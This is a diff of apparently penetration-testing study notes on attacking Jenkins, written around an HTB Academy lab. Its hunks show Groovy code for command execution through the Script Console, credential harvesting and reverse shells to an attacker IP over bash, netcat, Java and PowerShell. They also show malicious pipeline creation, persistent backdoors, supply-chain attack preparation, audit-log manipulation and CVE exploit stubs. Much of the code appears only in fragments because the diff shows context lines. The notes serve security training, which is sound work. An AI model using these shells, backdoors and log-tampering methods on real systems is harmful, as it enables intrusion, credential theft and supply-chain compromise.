@@ -7,26 +7,29 @@
 Jenkins exploitation represents one of the **most impactful attack vectors** in enterprise development environments, often providing **immediate SYSTEM/root privileges** and **access to the entire software supply chain**. With Jenkins frequently running with **elevated privileges** for system integration and **direct access to source code, credentials, and deployment systems**, successful exploitation can lead to **complete development infrastructure compromise**.
 
 **Critical Attack Vectors:**
-- **Script Console Exploitation** - Groovy-based command execution with SYSTEM privileges
-- **Pipeline Manipulation** - Build process injection and malicious code deployment
-- **Credential Harvesting** - Access to stored passwords, API keys, and deployment credentials
-- **Supply Chain Attacks** - Injection of malicious code into production deployments
-- **Agent Compromise** - Lateral movement through Jenkins build slaves
+
+* **Script Console Exploitation** - Groovy-based command execution with SYSTEM privileges
+* **Pipeline Manipulation** - Build process injection and malicious code deployment
+* **Credential Harvesting** - Access to stored passwords, API keys, and deployment credentials
+* **Supply Chain Attacks** - Injection of malicious code into production deployments
+* **Agent Compromise** - Lateral movement through Jenkins build slaves
 
 **Enterprise Impact:**
-- **Development Infrastructure Control** - Complete access to CI/CD pipeline and build processes
-- **Source Code Access** - Repository credentials and sensitive development data
-- **Production Deployment Capability** - Direct path to production system compromise
-- **Supply Chain Compromise** - Ability to inject malicious code into software products
-- **SYSTEM/Root Privileges** - Jenkins often runs with highest system privileges
 
----
+* **Development Infrastructure Control** - Complete access to CI/CD pipeline and build processes
+* **Source Code Access** - Repository credentials and sensitive development data
+* **Production Deployment Capability** - Direct path to production system compromise
+* **Supply Chain Compromise** - Ability to inject malicious code into software products
+* **SYSTEM/Root Privileges** - Jenkins often runs with highest system privileges
+
+***
 
 ## Script Console Exploitation
 
 ### Groovy Command Execution
 
 #### Script Console Access
+
 ```bash
 # Script Console URL structure
 http://jenkins.inlanefreight.local:8000/script
@@ -41,6 +44,7 @@ curl -s "http://jenkins.inlanefreight.local:8000/script" | \
 ```
 
 #### Basic Command Execution
+
 ```groovy
 // Basic command execution via Groovy
 def cmd = 'id'
@@ -52,6 +56,7 @@ println sout
 ```
 
 #### Enhanced Command Execution Script
+
 ```groovy
 // Enhanced Groovy command execution with error handling
 def executeCommand(String command) {
@@ -89,6 +94,7 @@ executeCommand("netstat -tulpn | grep LISTEN")
 ### Linux System Exploitation
 
 #### Information Gathering Scripts
+
 ```groovy
 // Comprehensive Linux system reconnaissance
 def systemRecon() {
@@ -123,6 +129,7 @@ systemRecon()
 ```
 
 #### File System Exploration
+
 ```groovy
 // Jenkins file system exploration and sensitive data discovery
 def exploreJenkinsFiles() {
@@ -169,6 +176,7 @@ exploreJenkinsFiles()
 ```
 
 #### Credential and Secret Harvesting
+
 ```groovy
 // Jenkins credential and secret extraction
 def harvestCredentials() {
@@ -231,6 +239,7 @@ harvestCredentials()
 ### Reverse Shell Establishment
 
 #### Linux Reverse Shell Scripts
+
 ```groovy
 // Method 1: Bash reverse shell via Groovy
 def bashReverseShell(String attackerIP, int port) {
@@ -285,6 +294,7 @@ def netcatReverseShell(String attackerIP, int port) {
 ```
 
 #### Advanced Persistent Shell
+
 ```groovy
 // Persistent reverse shell with reconnection capability
 def persistentReverseShell(String attackerIP, int port, int reconnectInterval = 60) {
@@ -321,6 +331,7 @@ done &
 ### Windows System Exploitation
 
 #### Windows Command Execution
+
 ```groovy
 // Windows-specific command execution
 def windowsCommand(String command) {
@@ -373,6 +384,7 @@ windowsRecon()
 ```
 
 #### Windows Reverse Shell
+
 ```groovy
 // Java-based reverse shell for Windows
 def javaReverseShell(String host, int port) {
@@ -456,13 +468,14 @@ while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
 // powershellReverseShell("10.10.14.15", 4444)
 ```
 
----
+***
 
 ## Build System Exploitation
 
 ### Pipeline Manipulation
 
 #### Malicious Pipeline Creation
+
 ```groovy
 // Create malicious build pipeline via Script Console
 def createMaliciousPipeline(String jobName, String attackerIP, int port) {
@@ -535,6 +548,7 @@ pipeline {
 ```
 
 #### Existing Pipeline Modification
+
 ```groovy
 // Modify existing pipeline to include backdoor
 def modifyExistingPipeline(String existingJobName, String attackerIP, int port) {
@@ -591,6 +605,7 @@ def modifyExistingPipeline(String existingJobName, String attackerIP, int port) 
 ### Agent and Slave Exploitation
 
 #### Agent Registration and Control
+
 ```groovy
 // Enumerate and control Jenkins agents/slaves
 def manageJenkinsAgents() {
@@ -643,13 +658,14 @@ def manageJenkinsAgents() {
 manageJenkinsAgents()
 ```
 
----
+***
 
 ## Known Vulnerability Exploitation
 
 ### CVE-2018-1999002 & CVE-2019-1003000
 
 #### Pre-Authentication RCE Exploitation
+
 ```groovy
 // Exploit for Jenkins dynamic routing bypass (CVE-2018-1999002)
 // Combined with sandbox bypass (CVE-2019-1003000)
@@ -688,6 +704,7 @@ def x
 ### Jenkins 2.150.2 Node.js RCE
 
 #### Job Creation Privilege Abuse
+
 ```groovy
 // Exploit for Jenkins 2.150.2 Node.js RCE vulnerability
 // Requires JOB creation and BUILD privileges
@@ -753,16 +770,18 @@ exec(payload, (error, stdout, stderr) => {
 // createNodeJSRCEJob("nodejs-backdoor", "10.10.14.15", 4444)
 ```
 
----
+***
 
 ## HTB Academy Lab Solutions
 
 ### Lab 1: Jenkins RCE and Flag Retrieval
+
 **Question:** "Attack the Jenkins target and gain remote code execution. Submit the contents of the flag.txt file in the /var/lib/jenkins3 directory"
 
 **Solution Methodology:**
 
 #### Step 1: Environment Setup and Authentication
+
 ```bash
 # Add VHost entry to /etc/hosts
 echo "TARGET_IP jenkins.inlanefreight.local" >> /etc/hosts
@@ -779,6 +798,7 @@ curl -b cookies.txt http://jenkins.inlanefreight.local:8000/manage | grep -q "Ma
 ```
 
 #### Step 2: Script Console Access
+
 ```bash
 # Access Jenkins Script Console
 curl -b cookies.txt http://jenkins.inlanefreight.local:8000/script
@@ -789,6 +809,7 @@ curl -b cookies.txt http://jenkins.inlanefreight.local:8000/script | \
 ```
 
 #### Step 3: Command Execution via Groovy Script
+
 ```groovy
 // Basic command execution to verify access
 def cmd = 'whoami'
@@ -802,6 +823,7 @@ println sout
 ```
 
 #### Step 4: Flag Discovery and Retrieval
+
 ```groovy
 // Method 1: Direct flag reading
 def flagPath = '/var/lib/jenkins3/flag.txt'
@@ -835,6 +857,7 @@ println "Flag search results: $exploreSout"
 ```
 
 #### Step 5: Alternative Reverse Shell Method (if needed)
+
 ```groovy
 // Establish reverse shell for interactive access
 def attackerIP = "10.10.14.15"  // Replace with your VPN IP
@@ -854,6 +877,7 @@ try {
 ```
 
 #### Step 6: Expected Flag Retrieval
+
 ```bash
 # From reverse shell or direct Groovy execution:
 cat /var/lib/jenkins3/flag.txt
@@ -865,6 +889,7 @@ cat /var/lib/jenkins3/flag.txt
 ```
 
 #### Step 7: Verification and Documentation
+
 ```groovy
 // Comprehensive system information for verification
 def verificationCommands = [
@@ -889,6 +914,7 @@ verificationCommands.each { cmd ->
 ### 🎯 HTB Academy Lab Summary
 
 **Complete Lab Methodology:**
+
 1. **Environment Setup** - VHost configuration and connectivity verification
 2. **Authentication** - Login with admin:admin credentials
 3. **Script Console Access** - Navigate to /script endpoint
@@ -897,18 +923,20 @@ verificationCommands.each { cmd ->
 6. **Verification** - Confirm RCE and flag retrieval
 
 **Key Technical Steps:**
-- **Groovy Script Execution** - Jenkins Script Console abuse
-- **File System Access** - Direct file reading via Groovy/Java
-- **Command Execution** - Process creation and output capture
-- **Alternative Methods** - Reverse shell for interactive access
 
----
+* **Groovy Script Execution** - Jenkins Script Console abuse
+* **File System Access** - Direct file reading via Groovy/Java
+* **Command Execution** - Process creation and output capture
+* **Alternative Methods** - Reverse shell for interactive access
+
+***
 
 ## Post-Exploitation and Persistence
 
 ### Jenkins Backdoor Installation
 
 #### Persistent Script Console Access
+
 ```groovy
 // Create persistent backdoor in Jenkins configuration
 def installPersistentBackdoor() {
@@ -964,6 +992,7 @@ executeBackdoor()
 ```
 
 #### Supply Chain Attack Preparation
+
 ```groovy
 // Prepare for supply chain attacks through build modification
 def prepareSupplyChainAttack() {
@@ -1010,13 +1039,14 @@ def prepareSupplyChainAttack() {
 // prepareSupplyChainAttack()
 ```
 
----
+***
 
 ## Defense Evasion and Operational Security
 
 ### Log Evasion Techniques
 
 #### Jenkins Audit Log Manipulation
+
 ```groovy
 // Jenkins log analysis and manipulation
 def manipulateJenkinsLogs() {
@@ -1051,6 +1081,7 @@ def manipulateJenkinsLogs() {
 ```
 
 ### Anti-Detection Measures
+
 ```groovy
 // Stealth command execution with minimal footprint
 def stealthExecution(String command) {
@@ -1081,39 +1112,43 @@ def stealthExecution(String command) {
 // println result
 ```
 
----
+***
 
 ## Professional Assessment Integration
 
 ### Jenkins Security Assessment Workflow
 
 #### Discovery Phase
-- [ ] **Service Identification** - Port scanning and Jenkins fingerprinting
-- [ ] **Version Detection** - API endpoints and interface analysis
-- [ ] **Authentication Testing** - Default credentials and anonymous access
-- [ ] **Plugin Enumeration** - Security plugins and extension analysis
+
+* [ ] **Service Identification** - Port scanning and Jenkins fingerprinting
+* [ ] **Version Detection** - API endpoints and interface analysis
+* [ ] **Authentication Testing** - Default credentials and anonymous access
+* [ ] **Plugin Enumeration** - Security plugins and extension analysis
 
 #### Exploitation Phase
-- [ ] **Script Console Access** - Groovy command execution capability
-- [ ] **Pipeline Manipulation** - Build process injection and modification
-- [ ] **Credential Harvesting** - Stored secrets and API key extraction
-- [ ] **Agent Compromise** - Build slave exploitation and lateral movement
+
+* [ ] **Script Console Access** - Groovy command execution capability
+* [ ] **Pipeline Manipulation** - Build process injection and modification
+* [ ] **Credential Harvesting** - Stored secrets and API key extraction
+* [ ] **Agent Compromise** - Build slave exploitation and lateral movement
 
 #### Post-Exploitation Phase
-- [ ] **Persistence Establishment** - Backdoor installation and maintenance
-- [ ] **Supply Chain Preparation** - Production deployment access
-- [ ] **Lateral Movement** - Network traversal through Jenkins connectivity
-- [ ] **Data Exfiltration** - Source code and credential extraction
 
----
+* [ ] **Persistence Establishment** - Backdoor installation and maintenance
+* [ ] **Supply Chain Preparation** - Production deployment access
+* [ ] **Lateral Movement** - Network traversal through Jenkins connectivity
+* [ ] **Data Exfiltration** - Source code and credential extraction
+
+***
 
 ## Next Steps
 
 After Jenkins exploitation mastery:
-1. **[GitLab Discovery & Attacks](gitlab-discovery-attacks.md)** - Source code management exploitation
-2. **[CI/CD Pipeline Security](cicd-pipeline-security.md)** - Advanced build system attacks
-3. **[Splunk Discovery & Attacks](splunk-discovery-attacks.md)** - Infrastructure monitoring exploitation
+
+1. [**GitLab Discovery & Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/gitlab-discovery-attacks.md) - Source code management exploitation
+2. [**CI/CD Pipeline Security**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/cicd-pipeline-security.md) - Advanced build system attacks
+3. [**Splunk Discovery & Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/attacking-common-applications/splunk-discovery-attacks.md) - Infrastructure monitoring exploitation
 
 **💡 Key Takeaway:** Jenkins exploitation provides **immediate high-privilege access** to **development infrastructure** with **SYSTEM/root execution context**. Master **Script Console abuse**, **Groovy command execution**, and **pipeline manipulation** for **reliable CI/CD compromise** and **supply chain attack capabilities**.
 
-**⚔️ Professional Impact:** Jenkins compromises often lead to **complete development infrastructure control**, **source code access**, **production deployment capabilities**, and **supply chain attack opportunities**, making these skills **critical for advanced penetration testing** in **enterprise environments**. 
+**⚔️ Professional Impact:** Jenkins compromises often lead to **complete development infrastructure control**, **source code access**, **production deployment capabilities**, and **supply chain attack opportunities**, making these skills **critical for advanced penetration testing** in **enterprise environments**.
